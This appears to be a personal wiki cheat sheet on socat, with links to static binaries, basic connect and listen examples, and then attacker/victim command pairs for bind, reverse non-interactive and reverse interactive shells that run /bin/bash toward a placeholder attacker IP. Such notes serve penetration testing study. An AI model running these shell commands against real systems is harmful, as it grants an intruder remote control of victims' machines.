Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2020-04-10T08:54:59-05:00

====== socat ======
Created Friday 10 April 2020

Connects two streams to eachother

===== Installation =====

==== Static binaries ====
There appear to be no version fo x86 Linux and Window

{{{code: lang="texinfo" linenumbers="False"
https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.1/socat-1.7.4.1-x86			# Linux x86
https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.1/socat-1.7.4.1-x86_64		# Linux x86_64
https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.1/socat-1.7.4.1-armhf			# Arm hard float
https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.1/socat-1.7.4.1-aarch64		# ARM
}}}


==== Darwin ====
* https://github.com/andrew-d/static-binaries/blob/master/binaries/darwin/socat

=== Linux x86_64 ===
* https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true


===== Arguments =====
{{{code: lang="sh" linenumbers="False"
-d -d 							Displays info messages
}}}






===== Examples =====

===== Executes a binary upon connection and ties the connection to the streams of the binary =====
{{{code: lang="sh" linenumbers="False"
socat tcp-listen:1234,fork,reuseaddr,echo=0, exec:<binary name>
}}}


==== Connect to TCP service: ====
Connects stdin to TCP4:<host>:<port>
{{{code: lang="sh" linenumbers="False"
socat - TCP4:<host>:<port>  
}}}


==== Start listener ====
Connects socket to STDOUT
{{{code: lang="sh" linenumbers="False"
socat TCP4-LISTEN:<port> STDOUT 
}}}



==== Serve a file ====
Forks upon connection, outputs file onto connection
{{{code: lang="sh" linenumbers="False"
socat TCP4-LISTEN:<port>, fork file:<file>  
}}}



==== Bind shell ====
On Victim's machine:
Spawn shell on connect{{{code: lang="sh" linenumbers="False"
socat TCP-LISTEN:<port> EXEC:/bin/bash   
}}}


On attacker's machine
Connect to victim
{{{code: lang="sh" linenumbers="False"
nc <victim ip> <port>  
}}}


==== Reverse non-interactive shell ====
Attackers' host
{{{code: lang="sh" linenumbers="False"
socat -d -d TCP4-LISTEN:<port> STDOUT
}}}

Victim's host
{{{code: lang="sh" linenumbers="False"
socat -d -d TCP4:<host A>:<port> EXEC:/bin/bash 
}}}



==== Reverse interactive shell ====
On attacker's host
{{{code: lang="sh" linenumbers="False"
socat -d -d tcp-listen:<port> file:`tty`,raw,echo=0
}}}
 

On victim's host
{{{code: lang="sh" linenumbers="False"
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attackers ip>:<port>
}}}



===== SEE =====
https://www.pentestpartners.com/security-blog/socat-fu-lesson/
https://github.com/andrew-d/static-binaries/tree/master/binaries

[[Reverse Shells]]

